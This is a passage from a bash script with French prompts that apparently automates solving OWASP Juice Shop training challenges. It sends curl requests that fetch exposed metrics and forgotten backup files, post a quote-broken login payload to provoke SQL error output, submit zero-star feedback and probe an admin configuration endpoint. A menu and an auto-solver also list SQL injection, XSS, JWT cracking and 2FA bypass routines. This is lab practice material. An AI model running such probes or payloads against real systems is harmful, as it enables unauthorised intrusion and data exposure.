    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Exposed Metrics ⭐           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: exposedMetricsChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "exposedMetricsChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Exposed Metrics" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Access Prometheus metrics...${NC}\n"

    local resp=$(curl -s "${BASE}/metrics" 2>/dev/null)
    
    if echo "$resp" | grep -q "nodejs\|http_"; then
        if wait_for_challenge "$BASE" "exposedMetricsChallenge" 5; then
            log_challenge "Exposed Metrics" "⭐" "SUCCESS"
            echo -e "${GREEN}🎯 Challenge résolu !${NC}"
        fi
    fi

    read -p "👉 Entrée..."
}

# Challenge 22: Forgotten Sales Backup (⭐⭐⭐⭐)
challenge_sales_backup() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Sales Backup ⭐⭐⭐⭐         ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: forgottenSalesBackupChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "forgottenSalesBackupChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Sales Backup" "⭐⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Find forgotten backup...${NC}\n"

    local backup_files=(
        "/ftp/coupons_2013.md.bak"
    )

    for backup in "${backup_files[@]}"; do
        local resp=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}${backup}" 2>/dev/null)
        
        if [ "$resp" = "200" ]; then
            if wait_for_challenge "$BASE" "forgottenSalesBackupChallenge" 5; then
                log_challenge "Sales Backup" "⭐⭐⭐⭐" "SUCCESS"
                echo -e "\n${GREEN}🎯 Challenge résolu !${NC}"
                read -p "👉 Entrée..."
                return 0
            fi
        fi
    done

    read -p "👉 Entrée..."
}

# Challenge 23: Forgotten Dev Backup (⭐⭐⭐⭐)
challenge_dev_backup() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Dev Backup ⭐⭐⭐⭐           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: forgottenDevBackupChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "forgottenDevBackupChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Dev Backup" "⭐⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Find developer backup...${NC}\n"

    local resp=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}/ftp/package.json.bak" 2>/dev/null)
    
    if [ "$resp" = "200" ]; then
        if wait_for_challenge "$BASE" "forgottenDevBackupChallenge" 5; then
            log_challenge "Dev Backup" "⭐⭐⭐⭐" "SUCCESS"
            echo -e "${GREEN}🎯 Challenge résolu !${NC}"
        fi
    fi

    read -p "👉 Entrée..."
}

# ==========================
# CATÉGORIE 5: SECURITY MISCONFIGURATION (4 challenges)
# ==========================

# Challenge 24: Error Handling (⭐)
challenge_error_handling() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Error Handling ⭐            ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: errorHandlingChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "errorHandlingChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Error Handling" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Trigger detailed error message...${NC}\n"

    local error_payload='{"email":"test@test.com'\''","password":"x"}'
    
    local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$error_payload" 2>/dev/null)

    if echo "$resp" | grep -qi "sql\|sqlite\|error\|stack"; then
        if wait_for_challenge "$BASE" "errorHandlingChallenge" 5; then
            log_challenge "Error Handling" "⭐" "SUCCESS"
            echo -e "${GREEN}🎯 Challenge résolu !${NC}"
        fi
    fi

    read -p "👉 Entrée..."
}

# Challenge 25: Deprecated Interface (⭐⭐)
challenge_deprecated_interface() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Deprecated Interface ⭐⭐    ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: deprecatedInterfaceChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "deprecatedInterfaceChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Deprecated Interface" "⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Access deprecated B2B interface...${NC}\n"

    curl -s "${BASE}/#/complain" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "deprecatedInterfaceChallenge" 5; then
        log_challenge "Deprecated Interface" "⭐⭐" "SUCCESS"
        echo -e "${GREEN}🎯 Challenge résolu !${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 26: Vulnerable Library (⭐⭐⭐⭐)
challenge_vulnerable_library() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Vulnerable Library ⭐⭐⭐⭐  ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: knownVulnerableComponentChallenge${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Exploit vulnerable dependency...${NC}\n"
    echo -e "${YELLOW}💡 Ce challenge nécessite l'analyse de package.json${NC}"
    
    log_challenge "Vulnerable Library" "⭐⭐⭐⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# Challenge 27: Legacy Typosquatting (⭐⭐⭐⭐)
challenge_typosquatting() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Typosquatting ⭐⭐⭐⭐        ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: typosquattingNpmChallenge${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Find typosquatted dependency...${NC}\n"
    echo -e "${YELLOW}💡 Ce challenge nécessite l'analyse de package.json${NC}"
    
    log_challenge "Typosquatting" "⭐⭐⭐⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# ==========================
# CATÉGORIE 6: BONUS (3 challenges)
# ==========================

# Challenge 28: Score Board (⭐)
challenge_score_board() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Find Score Board ⭐          ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: scoreBoardChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "scoreBoardChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Score Board" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Find hidden score board...${NC}\n"

    curl -s "${BASE}/rest/admin/application-configuration" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "scoreBoardChallenge" 5; then
        log_challenge "Score Board" "⭐" "SUCCESS"
        echo -e "${GREEN}🎯 Challenge résolu !${NC}"
        echo -e "${CYAN}🔗 ${BASE}/#/score-board${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 29: Privacy Policy (⭐)
challenge_privacy_policy() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Privacy Policy ⭐            ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: privacyPolicyChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "privacyPolicyChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Privacy Policy" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Read privacy policy...${NC}\n"

    curl -s "${BASE}/#/privacy-security/privacy-policy" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "privacyPolicyChallenge" 5; then
        log_challenge "Privacy Policy" "⭐" "SUCCESS"
        echo -e "${GREEN}🎯 Challenge résolu !${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 30: Zero Stars (⭐)
challenge_zero_stars() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Zero Stars ⭐                ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: zeroStarsChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "zeroStarsChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Zero Stars" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Submit zero star feedback...${NC}\n"

    local feedback_data='{"captchaId":0,"captcha":"","comment":"Bad!","rating":0}'
    
    curl -s -X POST "${BASE}/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -d "$feedback_data" >/dev/null 2>&1

    if wait_for_challenge "$BASE" "zeroStarsChallenge" 5; then
        log_challenge "Zero Stars" "⭐" "SUCCESS"
        echo -e "${GREEN}🎯 Challenge résolu !${NC}"
    fi

    read -p "👉 Entrée..."
}

# ==========================
# AUTO SOLVER
# ==========================

auto_solve_all() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║      AUTO SOLVER - 30 Challenges          ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo

    local BASE=$(get_base_url)

    echo -e "${YELLOW}⚠️  Mode automatique - challenges résolus uniquement${NC}"
    echo -e "${CYAN}Les challenges manuels seront skippés${NC}\n"

    read -p "Lancer l'auto-solver ? (y/N): " confirm

    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return
    fi

    echo
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}🚀 AUTO SOLVER STARTED${NC}"
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo

    # Reset counter
    CHALLENGES_SOLVED=0

    # Liste des challenges automatisables
    local auto_challenges=(
        "challenge_score_board"
        "challenge_sqli_login"
        "challenge_xss_search"
        "challenge_admin_section"
        "challenge_view_basket"
        "challenge_confidential_doc"
        "challenge_exposed_metrics"
        "challenge_privacy_policy"
        "challenge_zero_stars"
    )

    for challenge_func in "${auto_challenges[@]}"; do
        echo -e "${CYAN}══════════════════════════════════════${NC}"
        $challenge_func
        sleep 2
    done

    echo
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}✅ AUTO SOLVER COMPLETED${NC}"
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    show_progress

    echo
    read -p "👉 Entrée pour continuer..."
}

# ==========================
# VÉRIFICATION GLOBALE
# ==========================

verify_all_challenges() {
    clear
    banner
    
    local BASE=$(get_base_url)
    
    show_all_solved "$BASE"

    read -p "👉 Entrée... "
}

# ==========================
# STATISTIQUES
# ==========================

show_statistics() {
    clear
    banner
    echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          Challenge Statistics             ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
    echo

    if [ ! -f "$CHALLENGES_LOG" ]; then
        echo -e "${YELLOW}Aucun challenge résolu pour le moment${NC}"
        read -p "👉 Entrée..."
        return
    fi

    echo -e "${GREEN}📊 Statistiques locales${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    local total=$(wc -l < "$CHALLENGES_LOG")
    local success=$(grep -c "SUCCESS" "$CHALLENGES_LOG")
    
    echo -e "   Total tentatives: ${total}"
    echo -e "   Réussis: ${GREEN}${success}${NC}"
    echo

    echo -e "${GREEN}📝 Derniers challenges${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    tail -n 10 "$CHALLENGES_LOG" | sed 's/^/   /'

    echo
    read -p "👉 Entrée..."
}

# ==========================
# MENU PRINCIPAL
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║  Juice Shop - 30 Challenges v8.0 FIXED   ║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
        echo

        echo -e "${MAGENTA}═══ INJECTION (8) ═══${NC}"
        echo -e "${GREEN}1)  🔓 Login Admin (SQLi) ⭐⭐${NC}"
        echo -e "${GREEN}2)  💉 DOM XSS ⭐${NC}"
        echo -e "${GREEN}3)  💉 Bonus Payload ⭐⭐${NC}"
        echo -e "${GREEN}4)  💉 Client Side XSS ⭐⭐⭐${NC}"
        echo -e "${GREEN}5)  📊 NoSQL Injection ⭐⭐⭐⭐${NC}"
        echo -e "${GREEN}6)  💉 Reflected XSS ⭐${NC}"
        echo -e "${GREEN}7)  💉 API-only XSS ⭐⭐⭐${NC}"
        echo -e "${GREEN}8)  🔐 LDAP Injection ⭐⭐⭐⭐⭐⭐${NC}"
        
        echo
        echo -e "${MAGENTA}═══ BROKEN AUTHENTICATION (5) ═══${NC}"
        echo -e "${GREEN}9)  🔑 Password Strength ⭐⭐${NC}"
        echo -e "${GREEN}10) ❓ Security Question ⭐${NC}"
        echo -e "${GREEN}11) 🎫 JWT Cracking ⭐⭐⭐⭐⭐${NC}"
        echo -e "${GREEN}12) 🔐 OAuth Password ⭐⭐⭐${NC}"
        echo -e "${GREEN}13) 📱 2FA Bypass ⭐⭐⭐⭐⭐${NC}"

        echo
        echo -e "${MAGENTA}═══ BROKEN ACCESS CONTROL (6) ═══${NC}"
        echo -e "${GREEN}14) 🚪 Admin Section ⭐⭐${NC}"
        echo -e "${GREEN}15) 🛒 View Basket ⭐⭐${NC}"
        echo -e "${GREEN}16) ⭐ Five Star Feedback ⭐⭐${NC}"
        echo -e "${GREEN}17) 🎟️  Forged Coupon ⭐⭐⭐⭐⭐⭐${NC}"
        echo -e "${GREEN}18) 🛒 Manipulate Basket ⭐⭐⭐${NC}"
        echo -e "${GREEN}19) 📜 Access Log ⭐⭐⭐⭐${NC}"

        echo
        echo -e "${MAGENTA}═══ SENSITIVE DATA (4) ═══${NC}"
        echo -e "${GREEN}20) 📄 Confidential Doc ⭐${NC}"
        echo -e "${GREEN}21) 📊 Exposed Metrics ⭐${NC}"
        echo -e "${GREEN}22) 💾 Sales Backup ⭐⭐⭐⭐${NC}"
        echo -e "${GREEN}23) 💾 Dev Backup ⭐⭐⭐⭐${NC}"

        echo
        echo -e "${MAGENTA}═══ MISCONFIGURATION (4) ═══${NC}"
        echo -e "${GREEN}24) ⚠️  Error Handling ⭐${NC}"
        echo -e "${GREEN}25) 🗄️  Deprecated Interface ⭐⭐${NC}"
        echo -e "${GREEN}26) 📦 Vulnerable Library ⭐⭐⭐⭐${NC}"
        echo -e "${GREEN}27) 🎭 Typosquatting ⭐⭐⭐⭐${NC}"

        echo
        echo -e "${MAGENTA}═══ BONUS (3) ═══${NC}"
        echo -e "${GREEN}28) 🎯 Score Board ⭐${NC}"
        echo -e "${GREEN}29) 📜 Privacy Policy ⭐${NC}"
        echo -e "${GREEN}30) 💫 Zero Stars ⭐${NC}"

        echo
        echo -e "${CYAN}═══ SPECIAL ═══${NC}"
        echo -e "${YELLOW}31) 🤖 Auto Solve (challenges automatiques)${NC}"
        echo -e "${MAGENTA}32) 📊 Voir Scoreboard Complet${NC}"
        echo -e "${CYAN}33) 📈 Statistiques${NC}"
        echo -e "${CYAN}34) 📜 Logs${NC}"
        echo -e "${RED}0)  ❌ Retour${NC}"
        
        echo
        read -p "👉 Choix : " choice

        case $choice in
            1) challenge_sqli_login ;;
            2) challenge_xss_search ;;
            3) challenge_xss_bonus ;;
            4) challenge_xss_client ;;
            5) challenge_nosql_login ;;
            6) challenge_xss_reflected ;;
            7) challenge_xss_api ;;
            8) challenge_ldap_injection ;;
            9) challenge_password_strength ;;
            10) challenge_security_question ;;
            11) challenge_jwt_cracking ;;
            12) challenge_oauth_password ;;
            13) challenge_2fa_bypass ;;
            14) challenge_admin_section ;;
            15) challenge_view_basket ;;
            16) challenge_five_star ;;
            17) challenge_forged_coupon ;;
            18) challenge_manipulate_basket ;;
            19) challenge_access_log ;;
            20) challenge_confidential_doc ;;
            21) challenge_exposed_metrics ;;
            22) challenge_sales_backup ;;
            23) challenge_dev_backup ;;
            24) challenge_error_handling ;;
            25) challenge_deprecated_interface ;;
            26) challenge_vulnerable_library ;;
            27) challenge_typosquatting ;;
            28) challenge_score_board ;;
            29) challenge_privacy_policy ;;
            30) challenge_zero_stars ;;
            31) auto_solve_all ;;
            32) verify_all_challenges ;;
            33) show_statistics ;;
            34)
                clear
                banner
                echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
                echo -e "${CYAN}║              Logs d'Exploits               ║${NC}"
                echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
                echo

                if [ -f "$CHALLENGES_LOG" ]; then
                    cat "$CHALLENGES_LOG"
                else
                    echo -e "${YELLOW}Aucun log disponible${NC}"
                fi

                echo
                read -p "👉 Entrée pour continuer... "
                ;;
            0) return ;;
            *)
                echo -e "${RED}❌ Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==========================
# Point d'entrée
# ==========================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
